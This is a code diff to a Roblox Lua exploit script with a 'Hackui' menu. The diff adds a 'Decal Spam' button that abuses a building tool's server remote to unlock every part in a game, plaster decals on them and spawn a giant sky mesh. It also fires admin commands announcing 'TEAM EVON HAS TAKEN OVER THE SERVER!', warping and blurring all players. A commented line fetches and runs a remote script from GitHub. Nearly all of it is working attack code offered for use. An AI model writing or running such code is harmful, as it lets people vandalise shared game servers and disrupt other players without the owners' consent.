@@ -26,45 +26,46 @@ local Gears = Instance.new("TextButton")
 local UICorner_10 = Instance.new("UICorner")
 local DS = Instance.new("TextButton")
 local UICorner_11 = Instance.new("UICorner")
-local OC = Instance.new("TextButton")
+local DSO = Instance.new("TextButton")
 local UICorner_12 = Instance.new("UICorner")
-local MusicFrame = Instance.new("Frame")
+local OC = Instance.new("TextButton")
 local UICorner_13 = Instance.new("UICorner")
+local MusicFrame = Instance.new("Frame")
+local UICorner_14 = Instance.new("UICorner")
 local Musicholder = Instance.new("ScrollingFrame")
 local Music = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
+local UICorner_15 = Instance.new("UICorner")
 local UIListLayout = Instance.new("UIListLayout")
 local Music_2 = Instance.new("TextButton")
-local UICorner_15 = Instance.new("UICorner")
-local Music_3 = Instance.new("TextButton")
 local UICorner_16 = Instance.new("UICorner")
+local Music_3 = Instance.new("TextButton")
+local UICorner_17 = Instance.new("UICorner")
 local Timer = Instance.new("Frame")
 local Line = Instance.new("Frame")
-local UICorner_17 = Instance.new("UICorner")
+local UICorner_18 = Instance.new("UICorner")
 local TimerText = Instance.new("TextLabel")
 local Text = Instance.new("TextLabel")
 local TimerMenu = Instance.new("Frame")
-local UICorner_18 = Instance.new("UICorner")
-local TimerText_2 = Instance.new("TextBox")
 local UICorner_19 = Instance.new("UICorner")
-local RunTimer = Instance.new("TextButton")
+local TimerText_2 = Instance.new("TextBox")
 local UICorner_20 = Instance.new("UICorner")
-local GearFrame = Instance.new("Frame")
+local RunTimer = Instance.new("TextButton")
 local UICorner_21 = Instance.new("UICorner")
+local GearFrame = Instance.new("Frame")
+local UICorner_22 = Instance.new("UICorner")
 local Gearholder = Instance.new("ScrollingFrame")
 local Gear = Instance.new("TextButton")
-local UICorner_22 = Instance.new("UICorner")
+local UICorner_23 = Instance.new("UICorner")
 local UIListLayout_2 = Instance.new("UIListLayout")
 local Gear_2 = Instance.new("TextButton")
-local UICorner_23 = Instance.new("UICorner")
-local Gear_3 = Instance.new("TextButton")
 local UICorner_24 = Instance.new("UICorner")
-Instance.new("UIDragDetector", Timer)
+local Gear_3 = Instance.new("TextButton")
+local UICorner_25 = Instance.new("UICorner")
+
 --Properties:
 
 Hackui.Name = "Hackui"
 Hackui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-Hackui.Enabled = true
 Hackui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Hackui.ResetOnSpawn = false
 
@@ -247,6 +248,23 @@ DS.TextWrapped = true
 
 UICorner_11.Parent = DS
 
+DSO.Name = "DSO"
+DSO.Parent = MainFrame
+DSO.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DSO.BackgroundTransparency = 1.000
+DSO.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DSO.BorderSizePixel = 0
+DSO.Position = UDim2.new(0, 0, 0.547123075, 0)
+DSO.Size = UDim2.new(1, 0, 0.0492359921, 0)
+DSO.Font = Enum.Font.SourceSans
+DSO.Text = "Decal Spam (OP)"
+DSO.TextColor3 = Color3.fromRGB(0, 0, 0)
+DSO.TextScaled = true
+DSO.TextSize = 14.000
+DSO.TextWrapped = true
+
+UICorner_12.Parent = DSO
+
 OC.Name = "O/C"
 OC.Parent = Hackui
 OC.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
@@ -261,7 +279,7 @@ OC.TextScaled = true
 OC.TextSize = 14.000
 OC.TextWrapped = true
 
-UICorner_12.Parent = OC
+UICorner_13.Parent = OC
 
 MusicFrame.Name = "MusicFrame"
 MusicFrame.Parent = Hackui
@@ -272,7 +290,7 @@ MusicFrame.Position = UDim2.new(0.423815519, 0, 0.0764006823, 0)
 MusicFrame.Size = UDim2.new(0.283486247, 0, 0.628183365, 0)
 MusicFrame.Visible = false
 
-UICorner_13.Parent = MusicFrame
+UICorner_14.Parent = MusicFrame
 
 Musicholder.Name = "Musicholder"
 Musicholder.Parent = MusicFrame
@@ -298,7 +316,7 @@ Music.TextScaled = true
 Music.TextSize = 14.000
 Music.TextWrapped = true
 
-UICorner_14.Parent = Music
+UICorner_15.Parent = Music
 
 UIListLayout.Parent = Musicholder
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -318,7 +336,7 @@ Music_2.TextScaled = true
 Music_2.TextSize = 14.000
 Music_2.TextWrapped = true
 
-UICorner_15.Parent = Music_2
+UICorner_16.Parent = Music_2
 
 Music_3.Name = "Music"
 Music_3.Parent = Musicholder
@@ -335,7 +353,7 @@ Music_3.TextScaled = true
 Music_3.TextSize = 14.000
 Music_3.TextWrapped = true
 
-UICorner_16.Parent = Music_3
+UICorner_17.Parent = Music_3
 
 Timer.Name = "Timer"
 Timer.Parent = Hackui
@@ -353,7 +371,7 @@ Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Line.BorderSizePixel = 0
 Line.Size = UDim2.new(1, 0, 0.172043011, 0)
 
-UICorner_17.Parent = Timer
+UICorner_18.Parent = Timer
 
 TimerText.Name = "TimerText"
 TimerText.Parent = Timer
@@ -392,7 +410,7 @@ TimerMenu.Position = UDim2.new(0.442201853, 0, 0.361629874, 0)
 TimerMenu.Size = UDim2.new(0.27889207, 0, 0.115449913, 0)
 TimerMenu.Visible = false
 
-UICorner_18.Parent = TimerMenu
+UICorner_19.Parent = TimerMenu
 
 TimerText_2.Name = "TimerText"
 TimerText_2.Parent = TimerMenu
@@ -408,7 +426,7 @@ TimerText_2.Text = ""
 TimerText_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 TimerText_2.TextSize = 14.000
 
-UICorner_19.Parent = TimerText_2
+UICorner_20.Parent = TimerText_2
 
 RunTimer.Name = "RunTimer"
 RunTimer.Parent = TimerMenu
@@ -425,7 +443,7 @@ RunTimer.TextScaled = true
 RunTimer.TextSize = 14.000
 RunTimer.TextWrapped = true
 
-UICorner_20.Parent = RunTimer
+UICorner_21.Parent = RunTimer
 
 GearFrame.Name = "GearFrame"
 GearFrame.Parent = Hackui
@@ -436,7 +454,7 @@ GearFrame.Position = UDim2.new(0.424770653, 0, 0.191850588, 0)
 GearFrame.Size = UDim2.new(0.283486247, 0, 0.628183365, 0)
 GearFrame.Visible = false
 
-UICorner_21.Parent = GearFrame
+UICorner_22.Parent = GearFrame
 
 Gearholder.Name = "Gearholder"
 Gearholder.Parent = GearFrame
@@ -462,7 +480,7 @@ Gear.TextScaled = true
 Gear.TextSize = 14.000
 Gear.TextWrapped = true
 
-UICorner_22.Parent = Gear
+UICorner_23.Parent = Gear
 
 UIListLayout_2.Parent = Gearholder
 UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
@@ -482,7 +500,7 @@ Gear_2.TextScaled = true
 Gear_2.TextSize = 14.000
 Gear_2.TextWrapped = true
 
-UICorner_23.Parent = Gear_2
+UICorner_24.Parent = Gear_2
 
 Gear_3.Name = "Gear"
 Gear_3.Parent = Gearholder
@@ -499,11 +517,561 @@ Gear_3.TextScaled = true
 Gear_3.TextSize = 14.000
 Gear_3.TextWrapped = true
 
-UICorner_24.Parent = Gear_3
+UICorner_25.Parent = Gear_3
 
 Music:SetAttribute("id", 142376088)
 Music_2:SetAttribute("id", 1837768745)
 Music_3:SetAttribute("id", 116672405522828)
+
+task.wait(3)
+local function TBAGNK_fake_script() -- TextButton.LocalScript 
+
+
+
+		--rrrg
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..131562215342104
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. 139345933010644
+					}
+				}
+			}
+			_(args)
+		end
+
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("106819842627724")  
+		wait(5)
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..131562215342104
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..131562215342104
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. 131562215342104
+					}
+				}
+			}
+			_(args)
+		end
+
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"131562215342104")
+					SetTexture(v,131562215342104)
+					--end)
+					MeshResize(v,Vector3.new(9000,9000,9000))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("2577916730")
+
+		-----------------------------------
+end
+--coroutine.wrap(TBAGNK_fake_script)()
 
 local function timer(Timertime:number)
 	local clone = Timer:Clone()
@@ -522,10 +1090,17 @@ Music.MouseButton1Click:Connect(function()
 	MusicFrame.Visible = false
 end)
 
+DSO.MouseButton1Down:Connect(function()
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";give me b") end end
+	TBAGNK_fake_script()
+end)
+
 DS.MouseButton1Click:Connect(function()
 	timer(5)
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";sh TEAM EVON HAS TAKEN OVER THE SERVER!") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";notice all TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";give me b") end end
+	TBAGNK_fake_script()
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";loopwarp all") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";blur all") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";time 24") end end
@@ -539,6 +1114,7 @@ DS.MouseButton1Click:Connect(function()
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";titler all TEAM EVON HAS TAKEN OVER THE SERVER!") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";music 129978203916047 ;pitch 0.22 ;volume 100") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";alert all TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	timer(1)
 end)
 
 TimerButton.MouseButton1Click:Connect(function()
@@ -683,5 +1259,4 @@ PM.MouseButton1Click:Connect(function()
 end)
 
 
-
---loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielNov2014/flying/main/adminhacks.lua"))()
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielNov2014/flying/main/spamdecals.lua"))()
